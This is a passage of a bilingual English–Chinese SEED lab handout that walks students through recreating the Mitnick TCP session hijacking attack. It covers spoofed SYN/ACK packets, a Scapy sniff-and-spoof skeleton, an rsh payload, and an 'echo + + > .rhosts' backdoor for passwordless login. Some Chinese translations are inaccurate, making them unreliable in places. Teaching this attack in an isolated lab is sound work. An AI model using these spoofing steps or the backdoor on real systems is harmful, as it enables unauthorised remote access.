showdown（引发了一场激烈的决斗） between the two people, and it eventually（终究） led to the arrest of Mitnick. The showdown was turned into books and Hollywood movies later. The attack is now known as the Mitnick attack, which is a special type of TCP session hijacking（劫持）. 1994年，米特尼克利用TCP协议中的漏洞以及下村努的两台计算机之间的信任关系，成功在下村努的电脑上发起了攻击。这次攻击引发了两个人之间的激烈对决，最终导致米特尼克被捕。这次对决之后被载入书籍和好莱坞电影中。这次攻击现在被称为米特尼克攻击，是TCP会话劫持的一种特殊类型。 The objective of this lab is to recreate the classic Mitnick attack, so students can gain the firsthand experience on such an attack. We will emulate（仿真） the settings that was originally on Shimomura’s computers, and then launch the Mitnick attack to create a forged（伪造的） TCP session between two of Shimomura’s computers. If the attack is successful, we should be able to run any command on Shimomura’s computer. This lab covers the following topics: 此次实验的目标是重建这次经典的米特尼克攻击， 让学生获得类似攻击的一手经验。我们将模拟在下村努电脑上的原始设置，并在下村努的两台电脑之间发起米特尼克攻击来创建伪造的TCP会话。如果攻击成功，我们将可以在下村努的电脑上执行任意命令。该实验覆盖以下主题： TCP session hijacking attack 会话劫持攻击 TCP three-way handshake protocol TCP三次握手协议 Remote shell（缩写rsh） 远程shell Packet sniffing and spoofing 数据包的监听和嗅探 Readings and related topics. Detailed coverage of the TCP session hijacking attack can be found in the SEED book, Computer Internet Security: A Hands-on Approach, 2nd Edition, by Wenliang Du. 阅读资料和相关主题：关于TCP会话劫持攻击的相关细节可以在由杜文亮教授编著的《计算机互联网安全：动手方法》第二版中找到。 Lab environment. This lab has been tested on our pre-built Ubuntu 16.04 VM, which can be downloaded from the SEED website. The lab requires three VMs. 实验环境：该实验已经在我们预创建的Ubuntu 16.04 VM上做过测试，镜像可以在SEED网站上进行下载。该实验需要使用3台虚拟机。 2.How the Mitnick Attack Works米特尼克攻击过程 The Mitnick attack is a special case of TCP session hijacking attacks. Instead of hijacking an existing TCP connection between victims A and B, the Mitnick attack creates a TCP connection between A and B first on their behalf, and then naturally hijacks the connection. 米特尼克攻击是TCP会话劫持攻击中的一个特殊案例。它关注于劫持在被害者主机A和B之间存在的TCP链接，米特尼克攻击首先在A、B之间创建一个TCP链接，然后自然的劫持该链接。 In the actual Mitnick attack, host A was called X-Terminal, which was the target. Mitnick wanted to log into X-Terminal and run his commands on it. Host B was a trusted server, which was allowed to log into X-Terminal without a password. In order to log into X-Terminal, Mitnick had to impersonate（模拟） the trusted server, so he did not need to provide any password. Figure 1 depicts（描述） the high-level picture of the attack. There are four primary steps in this attack. 在实际的米特尼克攻击中，主机A被称为X终端的目标。米特尼克想登录X终端并在上面执行他的命令。主机B是一台受信任的服务器，它被允许不需要输入密码就能登录到X终端。为了登录到X终端，米特尼克必须模拟受信任的服务器，以不需要提供任何密码。图一描述了该攻击的高级场景，攻击主要包含4步。 Step 1: Sequence number prediction（预测）. Before the attack, Mitnick needed to learn the pattern of the initial sequence numbers (ISN) on X-terminal (in those days, ISNs were not random). Mitnick sent SYN requests to X-terminal and received SYN+ACK responses, then he sent RESET packet to X-Terminal, to clear the half-open connection from X-Terminal’s queue (to prevent the queue from being filled up). After repeating this for twenty times. He found there was a pattern between two successive（连续的） TCP ISNs. This allowed Mitnick to predict ISNs, which was essential（必要） for the attack. 步骤1：序列号预测。在攻击前，米特尼克需要了解在X终端上的初始序列号（ISN）的模式。在当时，初始序列号并非随机产生。米特尼克发送SYN请求给X终端，并且接收SYN+ACK的回应，然后他发送RSESET包给X终端以清除来自X终端队列的半开放连接（用来防止队列被填满）。在重复20次后，他发现在两个连续的TCP初始序号间有一个模式。这使得米特尼克可以预测ISN号，这对于攻击是很有必要的。 Step 2: SYN flooding attack on the trusted server. To send a connection request from the trusted server to X-Terminal, Mitnick needed to send out a SYN packet from the trusted server to X-Terminal. X-Terminal would respond with a SYN+ACK packet, which was sent to the trusted server. Since the trusted server did not actually initiate the request, it would send a RESET packet to X-Terminal, asking X-Terminal to stop the 3-way handshake. This behavior caused trouble to the Mitnick attack.To solve this problem. Mitnick had to silence（安静） the trusted server. Therefore, before spoofing, Mitnick launched a SYN flooding attack on the server. Back then（那时）, operating systems were far more vulnerable（易受攻击的） to the SYN flooding attack. The attack could actually shut down the trusted computer, completely silencing it. 步骤2：在受信服务器上发起SYN泛洪攻击。为了从受信服务器发送连接请求到X终端，米特尼克需要从受信服务器发出一个SYN包给X终端。X终端将会回应一个SYN+ACK包，这个报文将会被送到受信服务器上。一旦受信服务器没有真的初始化过这个请求，它将发送RESET包给X终端，要求X终端停止3次握手。这个行为操作会导致米特尼克攻击出现问题。为了解决该问题，米特尼克需要使受信服务器保持沉默。因此，在欺骗前，米特尼克在服务器上发起SYN泛洪攻击。那时的操作系统更容易受到SYN泛洪攻击。攻击可能会导致受信服务器关机，实现使服务器沉默。 Step 3: Spoofing a TCP connection. Mitnick wanted to use rsh (remote shell) to run a backdoor command on X-Terminal; once the backdoor was setup, he could then log into X-Terminal. To run a remote shell on X-Terminal, Mitnick needed to pass the authentication, i.e, he needed to have a valid account on X-Terminal and know its password. Obviously（明显的）, he did not have that. 步骤3：伪造TCP连接。米特尼克想要使用rsh（远程shell）来运行在X终端上的后门命令行；一旦后门建立，他可以登录到X终端上。为了在X终端上运行一个后门，米特尼克需要通过身份认证等等操作，他需要在X-Terminal上拥有一个有效的帐户并知道其密码。很明显，他根本没有这些。 Shimomura often needed to log into X-Terminal from the trusted server. To avoid typing passwords each time, he added some information in the .rhosts file on X-Terminal, so when he logged into X- Terminal from the trusted server, no password would be asked. This was quite a common practice（实践） back then. With this setup, without typing any password, Shimomura could run a command on X-Terminal from the trusted server using rsh, or run rlogin to log into X-Terminal. Mitnick wanted to exploit（利用） this trusted relationship. 下村努经常需要从受信服务器上登录到X终端。为了避免每次登录都需要输入密码，他添加了一些信息到X终端的.rhosts文件，那么当他从受信服务器登录X终端时，无需要求使用密码。在那时，这是一个常用的命令操作。一旦完成该设置，无需输入密码，下村努就可以从受信服务器上使用rsh来运行在X终端上的命令或是允许rlog来登录到X终端。米特尼克想利用该受信关系。 He needed to create a TCP connection between the trusted server and X-Terminal, and then run rsh inside this connection. He first sent a SYN request to X-Terminal, using the trusted server’s IP as the source IP address. X-Terminal then sent a SYN+ACK response to the server. Since the server had been shut down, it would not send RESET to close the connection. 他需要在受信服务器和X终端上创建一个TCP连接，然后在该连接下运行rsh。他首先发送一个SYN请求给X终端，使用受信服务器的IP作为源IP地址。X终端将会发送SYN+ACK回应给服务器。一旦服务器处于关机状态，它将不会发送RESET包来关闭这个连接。 To complete the three-way handshake protocol, Mitnick needed to spoof an ACK packet, which must acknowledge the sequence number in X-Terminal’s SYN+ACK packet. Unfortunately, the SYN+ACK response only went to the trusted server, not to Mitnick, he could not see the sequence number. However, because of the prior（事先） investigation（调查）, Mitnick was able to predict what this number was, so he was able to successfully spoof the ACK response sent to X-Terminal to complete the TCP three-way handshake. 为了完成3次握手，米特尼克需要伪造一个ACK包，该报文必须知道在X终端发出的SYN+ACK包的序列号。不幸的是，SYN+ACK回应仅会发送给受信服务器，而不会给米特尼克，所以他不知道该序列号是多少。然而，因为做了事先调查，米特尼克可以预测该序号会是多少，所以他可以成功伪造一个ACK回应包发送给X终端，以完成TCP的三次握手。 Step 4: Running a remote shell. Using the established TCP connection between the trusted server and X-Terminal, Mitnick could send a remote shell request to X-terminal, asking it to run a command. Using this command, Mitnick wanted to create a backdoor on X-Terminal so that he could get a shell on X-Terminal anytime without repeating the attack. 步骤4：运行远程shell。使用在受信服务器和X终端之间建立好的TCP连接，米特尼克可以发送远程shell请求给X终端，要求它执行命令。使用这个命令，米特尼克想要在X终端上创建一个后门，那么他将可以不再重复该攻击就可以在任意时刻获取到X终端的shell。 All he needed to do was to add “+ +” to the .rhosts file on X-Terminal. He could achieve that by executing the following command using rsh on X-Terminal: “echo + + &gt; .rhosts”. Since rsh and rlogin program used .rhosts file for authentication, with this addition, X-Terminal would trust every rsh and rlogin request from anyone. 所有他需要做的就是在X终端上的.rhosts文件中添加上“+ +”。他可以通过在X终端上使用rsh执行以下命令来实现这一点：“ echo + +&gt; .rhosts”。由于rsh和rlogin程序使用.rhosts文件进行身份验证，因此，X终端将信任任何人的每个rsh和rlogin请求。 3.Lab Setup（实验设置）We need to use three VMs for this lab. One for X-Terminal, one for the trusted server, and one the attacker. In the real Mitnick attack, the attacker machine is a remote machine. In this lab, for the sake（缘故） of simplicity, we put all these three VMs on the same network. 在该实验中，我们需要使用3台虚拟机。一台作为X终端，一台作为受信服务器，另一台作为攻击者。在真实的米特尼克攻击中，攻击者机器是一台远端主机。在该实验中，为了简单起见，我们使这三台虚拟机都同处于一个网络中。 3.1 Installing the rsh programThe remote shell rsh is a command line program that can execute shell commands remotely. Although we will use rsh in this task, we should know that rsh and rlogin programs are not secure, and they are not used any more. They have been replaced by more secured programs, such as ssh. That is why in the modern Linux operating systems, the rsh command is actually a symbolic link to the ssh program. See the following 3.1 安装rsh程序 远程shell rsh是一个命令行程序，可以远程执行shell命令。尽管我们在这个实验中使用rsh，我们应该要知道rsh和rlogin程序是不安全的，并且已经不再被使用。他们已经被更安全的程序所替代，例如ssh。这就是为什么在现代Linux操作系统下，rsh命令实际上是ssh程序的符号链接。参考如下 12$ ls -al /etc/alternatives | grep rshlrwxrwxrwx 1 root root 12 Jul 25 2017 rsh -&gt; /usr/bin/ssh To recreate the Mitnick attack, we need to install the unsecure version of the rsh program. Obviously, the old version of the rsh no longer works, but an open-source project reimplements the remote shell clients and servers. It is called rsh-redone. Currently, it has not been installed in our VM yet, so we will use the following commands to install rsh server and client on all three VMs. 为了创建米特尼克攻击，我们需要安装rsh程序的不安全版本。很明显，旧版本的rsh不再起作用，但是一个开源项目重新实现了远程Shell客户端和服务器。该项目被称为rsh重现。当前，它并没有被安装在我们的虚拟机中，我们将在三台虚拟机中使用以下命令安装rsh服务器和客户端。 12$ sudo apt-get install rsh-redone-client$ sudo apt-get install rsh-redone-server 3.2 Configuration配置The rsh server program uses two files for authentication, .rhosts and /etc/hosts.equiv. Every time the server receives a remote command request, it will check the/etc/hosts.equiv. If the request comes from a hostname stored in the file, the server will accept it without asking for passwords. If /etc/hosts.equiv does not exist or do not have that hostname, rsh will check the .rhosts file on the user’s home directory. rsh服务器程序使用两个文件用来做认证，.rhosts*和/etc/hosts.equiv。每当服务器接收到一个远程命令请求，它将检测/etc/hosts.equiv文件。如果请求来自于在文件中所存储的主机名，则服务器将接受它并无需要求使用密码。如果/etc/hosts.equiv文件不存在，或是在文件中不包含主机名，那么rsh将检测在用户home目录下的.rhosts*文件。 Shimomura often needed to run remote commands on X-Terminal from the trusted server. To avoid typing passwords, he created a .rhosts file on host X-Terminal and put the trusted server’s IP address into the file. Note that the .rhosts file must reside（居住） at the top level of a user’s home directory and can be written only by the owner/user. Use the following commands on X-Terminal to do the setup. 下村努经常需要在受信服务器上远程到X终端上运行远程命令。为避免输入密码，他在X终端上创建了一个.rhosts文件并且在文件中存放了受信任服务器的IP地址。注意 .rhosts文件必须放置在用户家目录的顶层并且只能被文件所有者/用户所写入。在X终端上使用如下命令可以完成设置。 123$ touch .rhosts$ echo [Server’s IP address] &gt; .rhosts$ chmod 644 .rhosts To verify your configuration, try running the following command on the trusted server. 为确认你的配置，请尝试在受信服务器上运行如下命令。 1rsh [X-Terminal’s IP] date If the command prints the current date and time, your configuration is working now. If you see “Authentication Failure”, something in your setup may not be correct. One of the common mistakes is the permission on the .rhosts file: you should make sure it is only writable to the owner. 如果该命令打印出了当前日期和时间，则你的配置正在运行。 如果你看到了“身份验证失败”的提示，则说明你的设置可能不正确。 常见错误之一是对.rhosts文件的许可：你应确保该文件仅对所有者可写。 Allow all. To allow users to execute commands on X-Terminal from all IP addresses, we just need to put two plus signs (“+ +”) in the .rhosts file. This is very dangerous, and nobody should do that. But if you are an attacker, this is a convenient way to set up a backdoor. As we have mentioned（提到） before, this is what has been used in the Mitnick attack. 允许所有。为了允许任意IP地址用户在X终端上执行命令，我们仅需输入2个+符号（“++”）到rhosts文件中。这个操作很危险，任何人都不应该做该操作。但如果你是一名攻击者，这是一个设置后面的方便方法。正如我们之前提到的，这就是在米特尼克攻击中所使用到的。 4.Task 1: Simulated SYN flooding （模拟SYN泛洪）The operating systems at the time of the Mitnick Attack were vulnerable（易受攻击的） to SYN flooding attacks, which could mute（无声） the target machine or even shut it down. However, SYN flooding can no longer cause such a damage for modern operating systems. To simulate this affect, we will disconnect the trusted server from the network, so it is completely “muted”. Click on the network icon（图标） on the upper right corner（角落） of the desktop, and choose Disconnect. 在发生米特尼克攻击时，操作系统容易受到SYN的泛洪攻击，这将使目标主机无法回应甚至使得主机关机。然而，SYN泛洪攻击对于现代操作系统而言将不会造成这么严重的伤害。为了模拟该影响，我们将断开在网络中的受信任主机，受信主机将保持“沉默”。单击桌面右上角的网络图标，然后选择断开连接。 When X-Terminal receives a SYN packet from the trusted server, it will respond with a SYN+ACK packet. Before sending out this packet, it needs to know the MAC address of the trusted server. The ARP cache will be checked first. If there is no entry for the trusted server, X-Terminal will send out an ARP request packet to ask for the MAC address. Since the trusted server has been muted, no one is going to answer the ARP request, hence（于是） X-Terminal cannot send out the response. As a result, the TCP connection will not be established. 当X终端从受信任服务器收到一个SYN包，它将回应一个SYN+ACK包。在发送这个包前，它需要知道受信任主机的MAC地址。X终端首先检查ARP缓存。如果没有受信任服务器的条目，X终端将发送ARP广播请求报文来获取其MAC地址。一旦受信任服务器处于“沉默”状态，没有主机回应这个ARP广播请求，那么X终端将无法发送回应。最终TCP连接无法建立。 In the real attack, the trusted server’s MAC address was actually in X-Terminal’s ARP cache. Even if it was not, before silencing the trusted server, we could simply spoof an ICMP echo request from the trusted server to X-Terminal, that would trigger X-Terminal to reply to the trusted server, and hence would get the trusted server’s MAC address, and save it to the cache. 在真实攻击中，受信服务器的MAC地址是在X终端的ARP缓存中的。即使不是，在使受信任的服务器沉默之前，我们也可以简单地伪造一份ICMP回显请求从受信任的服务器发往X终端，这将触发X终端答复受信任的服务器，从而获得受信任的服务器的MAC 地址，并将其保存到缓存中。 To simplify the task, before disconnecting the trusted server, we will simply ping it from X-Terminal once, and then use the arp command to check and make sure that the MAC address is in the cache. It should be noted that cache entry may be deleted by the operating system if the OS fails to reach a destination using the cached MAC address. To simply your attack, you can run the following command on X-Terminal to permanently（永久的） add an entry to the ARP cache: 为简化任务，在断开受信服务器前，我们将简单从X终端上ping它，然后使用arp命令来检查并确保MAC地址保存在缓存中。应该注意的是，如果操作系统无法使用缓存的MAC地址到达目的地，则缓存条目可能会被操作系统删除。为简化你的攻击，你将在X终端上运行如下命令来给ARP缓存永久添加一个条目： 1$ sudo arp -s [Server’s IP] [Server’s MAC] 5.Task 2: Spoof TCP Connections and rsh Sessions（伪造TCP连接和rsh会话）Now that we have “brought down” the trusted server, we can impersonate the trusted server, and try to launch a rsh session with X-Terminal. Since rsh runs on top of TCP, we first need to establish a TCP connection between the trusted server and X-Terminal, and then run the rsh in this TCP connection. 现在我们已经关闭了受信服务器，我们可以模仿受信服务器，并且尝试和X终端发起rsh会话。rsh运行在TCP之上，我们需要在受信服务器和X终端上建立一个TCP连接，并且在这个连接上运行rsh。 One of the difficulties in the Mitnick attack is to predict the TCP sequence numbers. It was possible back then when TCP sequence numbers were not randomized. However, modern operating systems now randomize their TCP sequence numbers (as a countermeasure（对策） against TCP session hijacking attacks), so predicting the numbers becomes infeasible（不可行的）. To simulate（模拟） the situation of the original Mitnick attack, we allow students to sniff packets, so they can get the sequence numbers, instead of guessing them. 米特尼克攻击的难点之一在于预测TCP序号。那时有可能没有对TCP序列号进行随机分配。然而在现代操作系统中目前TCP序号是随机的（作为对抗TCP会话劫持攻击的对策），所以预测序列号变得不再可行。为了模拟原始的米特尼克攻击状况，我们允许学生伪造数据包，他们可以获取到序列号而无需再猜测它。 Restriction. To simulate the original Mitnick attack as closely as we can, even though students can sniff the TCP packets from X-Terminal, they cannot use all the fields in captured packets, because in the real attacks, Mitnick could not sniff packets. When students write their attack programs, they can only use the following fields from the captured packets. Penalty（惩罚，罚款） will be applied if other fields are used. 限制。为了尽可能模拟原始米特尼克攻击，尽管学生能从X终端伪造TCP数据包，但是他们不能使用在捕获到的数据包中的所有字段，因为在真实攻击中，米特尼克无法监听数据包。当学生写下他们的攻击程序，他们仅能使用捕获到的数据包的以下字段参数。如果使用到了其他字段参数信息，将会受到惩罚。 The TCP sequence number field (this does not include the acknowledgment field). TCP序号字段（该字段不包含在确认号ACK字段中） The TCP flag field. This allows us to know the types of the captured TCP packets. In the actual Mitnick attack, Mitnick knew exactly what type of packets were sent out by X-Terminal, because they are part of the TCP three-way handshake protocol. We allow students to use this field for task simplification. TCP标志字段。该字段允许我们知道捕获的TCP数据包类型。在实际的米特尼克攻击中，米特尼克知道什么样的数据包将被X终端发送出去，因为它们是TCP三次握手中的一部分。为了简化实验，我们允许学生使用这些字段。 All the length fields, including IP header length, IP total length, and TCP header length. These pieces of information are not necessary for the attacks. In the actual Mitnick attack, Mitnick knew exactly（究竟，恰好） what their values are. We allow students to use these fields for task simplification. 所有的长度字段，包括IP首部长度，IP数据报全长和TCP首部长度。对于这次攻击，这些信息没有什么必要。在真实的米特尼克攻击中，米特尼克知道这些值究竟是多少。为了简化实验，我们允许学生使用这些字段。 The behavior of rsh. To create a spoofed rsh session between the trusted server and X-Terminal, we need to understand the behavior of rsh. Let us start a rsh session from Host A to Host B, and then use Wireshark to capture the packets between them. We use the following command to run the date command on Host B from Host A via（通过） the rsh remote shell. rsh的行为。为了在受信服务器和X终端之间创建一个伪造的rsh会话，我们需要了解rsh的行为。让我们从主机A到主机B之间开始一个rsh会话，然后使用wireshark捕获他们之间的数据包。我们使用以下命令通过rsh远程shell从主机A在主机B上运行date命令。 12// On Host A$ rsh [B’s IP] date The packet trace in this rsh session is shown in the following. Here 10.0.2.7 is the Host A’s IP address, and 10.0.2.6 is Host B’s IP address. If a packet does not carry（携带） any TCP data, the length information (i.e. Len=0) is omitted. 以下展示了在rsh会话中的数据包追踪。主机A的IP地址是10.0.2.7，主机B的IP地址是10.0.2.6。如果数据包不携带任何TCP数据，那么长度信息（如Len=0）将被忽略。 Listing 1: Packet trace of a rsh session（监听1：rsh会话中的数据包追踪） 12345678910111213141516171819#The first connection SRC IP DEST IP TCP Header1 10.0.2.7 10.0.2.6 1023 -&gt; 514 [SYN] Seq=7789335362 10.0.2.6 10.0.2.7 514 -&gt; 1023 [SYN,ACK] Seq=10879102 Ack=7789335373 10.0.2.7 10.0.2.6 1023 -&gt; 514 [ACK] Seq=778933537 Ack=108791034 10.0.2.7 10.0.2.6 1023 -&gt; 514 [ACK] Seq=778933537 Ack=10879103 Len=20 RSH Session Establishment Data: 1022\x00seed\x00seed\x00date\x005 10.0.2.6 10.0.2.7 514 -&gt; 1023 [ACK] Seq=10879103 Ack=778933557#The second connection 6 10.0.2.6 10.0.2.7 1023-&gt;1022 [SYN] Seq=39206115267 10.0.2.7 10.0.2.6 1022-&gt;1023 [SYN,ACK] Seq=3958269143 Ack=39206115278 10.0.2.6 10.0.2.7 1023-&gt;1022 [ACK] Seq=3920611527 Ack=3958269144#Going back to the first connection9 10.0.2.6 10.0.2.7 514 -&gt; 1023 [ACK]Seq=10879103 Ack=778933557 Len=1 Data: \x0010 10.0.2.7 10.0.2.6 1023 -&gt; 514 [ACK]Seq=778933557 Ack=1087910411 10.0.2.6 10.0.2.7 514 -&gt; 1023 [ACK]Seq=10879104 Ack=778933557 Len=29 Data: Sun Feb 16 13:41:17 EST 2020 We can observe that a rsh session consists of two TCP connections. The first connection is initiated by Host A (the client). An rshd process on Host B is listening to connection requests at port 514. Packets 1 to 3 are for the three-way handshake protocol. After the connection has been established, the client send rsh data (including user IDs and commands) to the Host B (Packet 4). The rshd process will authenticate the user, and if the user is authenticated, rshd initiates a separate（分开，另外） TCP connection with the client. 我们可以观察在这两个TCP连接下的rsh会话。第一个连接是主机A（客户端）的初始化启动。主机B上的rshd进程在514号端口，正在监听连接请求。数据包1到3是三次握手过程。在连接建立后，客户端发送了rsh数据（包括用户ID和命令）到主机B（数据包4）。rshd进程将认证用户，如果用户通过认证，rshd会与客户端启动一个新的TCP连接。 The second connection is used for sending error messages. In the trace above, since there was no error, the connection was never used, but the connection must be successfully established, or rshd will not continue. Packets 6 to 7 are for the three-way handshake protocol of the second connection. 第二个连接将被用来发送一个错误的信息。在上面的追踪中，如果没有错误，那么连接将永远不会被使用，但是连接必须要成功建立，不然rshd将无法继续。数据包6到7用于第二个连接的三次握手。 After the second connection has been established, Host B will send a zero byte to the client (using the first connection), Host A will acknowledge the packet. After that, rshd on Host B will run the command sent by the client, and the output of the command will be sent back to the client, all via the first connection. Students can use Wireshark to capture a rsh session, and study its behaviors, before launching the Mitnick attack. We divide the attack task into two sub-tasks, each one focusing on one connection. 在第二次连接建立之后，主机B将发送一个0字节给客户端（使用第一个连接），主机A将回应数据包。之后，主机B上的rshd将运行客户端发送的命令，然后命令的输出内容将被送还到客户端，这些数据包都将通过第一个连接。在发起米特尼克攻击前，学生可以使用wireshark来捕获rsh会话并学习其行为。我们拆分这次的攻击任务为两个子任务，每个子任务都关注于一个连接。 We will use Scapy for most of the tasks in this lab. The current version of the SEED VM may not have Scapy installed for Python3. We can use the following command to install Scapy for Pyhon3. 我们将在本次实验中使用scapy来贯穿大部分任务。当前版本的SEED VM可能未安装适用于Python3的Scapy。我们可以使用以下命令来安装Python3。 1$ sudo pip3 install scapy 5.1 Task 2.1: Spoof the First TCP Connection（伪造第一个TCP连接）The first TCP connection is initiated by the attacker via a spoofed SYN packet. As you can see in Figure 2, after X-Terminal receives the SYN packet, it will in turn send a SYN+ACK packet to the trusted server. Since the server has been brought down, it will not reset the connection. The attacker, which is on the same network, can sniff the packet and get the sequence number. 攻击者通过一个伪造的SYN报文对第一个TCP连接初始化。通过图2你可以看到，在X终端接收到SYN包后，它将发送一个SYN+ACK的报文给受信服务器。一旦受信服务器被攻击down掉，它将不会重置该连接。在处于同一网络中的攻击者就可以监听数据包并获取seq号。 Step 1: Spoof a SYN packet. Students should write a program to spoof a SYN packet from the trusted server to X-Terminal (see Packet 1 in Listing 1). There are six standard TCP code bits, and they can be set in the flag field of the TCP header. The following code examples show how to set the flag field and how to check whether certain（某些） bits are set in the flag field. 步骤1：伪造一个SYN包。学生需要写下一个程序来伪造从受信服务器发往X终端的SYN包（查看在监听1表中的数据包1）。有6个TCP的标志位，他们可以在TCP头部中的标志字段中被设置。以下代码展示了如何设置标志字段并且如何检测在标志字段中某些bit被设置。 123456# 'U': URG bit # 'A': ACK bit # 'P': PSH bit # 'R': RST bit # 'S': SYN bit # 'F': FIN bit 12345678910tcp = TCP()# Set the SYN and ACK bits tcp.flags = "SA"# Check whether the SYN and ACK are the only bits set if tcp.flags == "SA":# Check whether the SYN and ACK bits are setif 'S' in tcp.flags and 'A' in tcp.flags: It should be noted that the source port of the SYN packet must be from port 1023. If a different port is used, rsh will reset the connection after the connection is established. If this step is successful, from Wireshark, we should be able to see a SYN+ACK packet coming out of X-Terminal (see Packet 2 in Listing 1). 有一点需要注意，SYN包中的源端口需要来自于端口1023.如果使用了一个不同的端口，rsh在连接建立后将重置连接。如果这步成功，从wireshark中我们应该可以看到SYN+ACK包将从X终端发送出来（查看监听表1中的2号包）。 Step 2: Respond to the SYN+ACK packet. After X-Terminal sends out a SYN+ACK, the trusted server needs to send out an ACK packet to complete the three-way handshake protocol. The acknowledge number in the packet should be S+1, where S is the sequence number contained in the SYN+ACK packet. See Packet 3 in Listing 1. 步骤2: 响应SYN+ACK数据包。在X终端发送出SYN+ACK后，受信服务器需要发出一个ACK包来完成三次握手过程。在回应包中的S应该要+1，其中S是在SYN+ACK包中的seq号。可以从监听表1中的第三个包看出来。 In the actual Mitnick attack, the attacker could not see the SYN+ACK packet, because it was sent to the trusted server, not to the attacker. That is why Mitnick had to guess the value of the sequence number. In this lab, we allow students to get the sequence number via packet sniffing. 在真实的米特尼克攻击中，攻击者无法获知SYN+ACK包，因为它是发往了受信服务器上，而非发往攻击者。这就是为什么米特尼克需要猜测seq号的值了。在本次实验中，我们允许学生通过数据包监听来获得seq号的值。 Students need to write a sniff-and-spoof program using Scapy and run it on the attacker’s machine. Here is a skeleton（骨架） of a sniff-and-spoof program that might be useful. Please make sure to follow the restrictions（限制） described at the beginning of the section, or you will get a penalty（惩罚，罚款）. 学生需要使用scapy写下一个监听-欺骗程序，并在攻击者的主机上运行该程序。这有一份监听-欺骗程序的大致框架可能会对你有用。请确保你遵循了开头部分的限制描述，否则你将会有惩罚。 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python3from scapy.all import *x_ip = "10.0.2.6" # X-Terminalx_port = 514 # Port number used by X-Terminalsrv_ip = "10.0.2.7" # The trusted serversrv_port = 1023 # Port number used by the trusted server# Add 1 to the sequence number used in the spoofed SYNseq_num = 0x1000 + 1def spoof(pkt): global seq_num # We will update this global variable in the function old_ip = pkt[IP] old_tcp = pkt[TCP] # Print out debugging informationtcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 # TCP data lengthprint("&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))# Construct the IP header of the responseip = IP(src=srv_ip, dst=x_ip)# Check whether it is a SYN+ACK packet or not;# if it is, spoof an ACK packet# ... Add code here ...myFilter = ’tcp’ # You need to make the filter more specificsniff(filter=myFilter, prn=spoof) Step 3: Spoof the rsh data packet. Once the connection is established, the attacker needs to send rsh data to X-Terminal. The structure（结构体） of the rsh data is shown below. 步骤3：伪造rsh数据包。一旦连接建立成功，攻击者需要发送rsh数据给X终端。rsh数据的结构如下所示。 1[port number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00 The data has four parts: a port number, client’s user ID, server’s user ID, and a command. The port number will be used for the second connection (see Task 2.2). Both client and server’s user ID is seed in our VM. The four fields are separated by a byte 0. Note that there is also a byte 0 at the end of the rsh data. An example is given in the following. In this example, we tell X-Terminal that we are going to listen on port 9090 for the second connection and the command we want to run is “touch /tmp/xyz”. 数据有4个部分：端口号，客户端用户ID，服务器用户ID和一个命令。端口号将被用于第二个连接（参考任务2.2）。客户端和服务器的用户ID都是我们VM中的种子。4个字段被字节0分隔开。注意在rsh数据最后也有个字节0.以下给了一个示例，在该例中，我们告诉X终端我们将要在9090端口上为第二个连接进行监听，同时命令字段我们想要执行“touch /tmp/xyz”。 12data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'send(IP()/TCP()/data, verbose=0) Students should modify the sniff-and-spoof program written in Step 2, so an rsh data packet is sent to X-Terminal (see Packet 4 in Listing 1). If this step is successful, from Wireshark, we can see that X-Terminal is going to initiate a TCP connection to the trusted server’s port 9090, which is the port number specified in our rsh data. 学生需要修改在步骤2写下的监听-欺骗程序，然后一个rsh数据包将会发送给X终端（参考监听表1的数据包4）。如果该步骤成功，从wireshark上我们可以看到X终端将初始化一个连接到受信服务器的9090端口，该端口号是我们在rsh数据中指定的。 In your report, please describe whether the touch command has been executed on X-Terminal or not.Please also include snapshots（快照） of your Wireshark. 在你的报告中，请描述在X终端上touch命令是否有被执行，同时附上你的wireshark截图。 5.2 Task 2.2: Spoof the Second TCP Connection（伪造第二个TCP连接） After the first connection has been established, X-Terminal will initiate the second connection. This connection is used by rshd to send out error messages. In our attack, we will not use this connection, but if this connection is not established, rshd will stop without executing our command. Therefore, we need to use spoofing to help X-Terminal and the trusted server finish establishing this connection. See Figure 3. 在第一个连接被建立后，X终端将初始化第二个连接。rshd使用此连接发送错误消息。在我们的攻击中，我们不需要使用该连接，但是如果该连接没有被建立，rshd将会停止而不执行我们的命令。因此，我们需要使用伪造来帮助X终端和受信服务器完成建立该连接。参考图3。 Students need to write another sniff-and-spoof program, which sniffs the TCP traffic going to the port 9090 of the trusted server (assuming（假设） 9090 is used in Task 2.1). When it sees a SYN packet, it should respond with a SYN+ACK packet. See Packet 7 in Listing 1 for an example. 学生需要写另外一个监听-欺骗程序，它监听去往受信服务器9090端口的TCP流量（假设在任务2.1中9090端口已被使用）。当它发现一个SYN包，它将回应一个SYN+ACK包。有关示例参考在监听表1的7号包。 If both connections have been successfully established, rshd will execute the command contained in the rsh data packet. Please check the /tmp folder and see whether /tmp/xyz is created and whether its timestamp（时间戳） matches the present time. Please include your evidence in your report. 如果两个连接都被成功建立，rshd将会执行被包含在rsh数据包中的命令。请检测/tmp文件夹并查看是否/tmp/xyz被创建，同时检测时间戳是否和当前时间匹配。请在你的报告中写下你的证据。 6 Task 3: Set Up a Backdoor(设置后门)In Task 2, we only run a touch command in the attack to prove that we can successfully run a command on X-Terminal. If we want to run more commands later, we can always launch the same attack. That is quite inconvenient. 在任务2，我们在攻击中仅运行了一个touch命令来证明我们成功在X终端上运行了一个命令。如果我们想之后运行更多命令，我们可以总是发起相同的攻击。但这相当不方便。 Mitnick did plan to come back to X-Terminal. Instead of launching the attack again and again, he planted a backdoor in X-Terminal after his initial attack. This backdoor allowed him to log into X-Terminal normally anytime he wanted, without typing any password. To achieve this goal, as we have discussed in Section , all we need to do is to add the string “+ +” to the .rhosts file (in a single line). We can include the following command in our rsh data. 米特尼克计划重回X终端。他计划在他的初始化攻击后在X终端上留下一个后门，而非每次重复发起该攻击。按理来说该后门允许他在任意他想要的时刻登录X终端，而无需输入任何密码。为实现这一目标，正如我们之前讨论的，我们需要做的就是添加“+ +”到.rhosts文件（在单独的一行中）。我们可以在我们的rsh数据中包含以下命令。 1echo + + &gt; .rhosts Students should replace the rsh command in Task 2 with the echo command above, and then repeat the attack. If the attack succeeds, the attacker should be able to remotely log into X-Terminal using the following command, 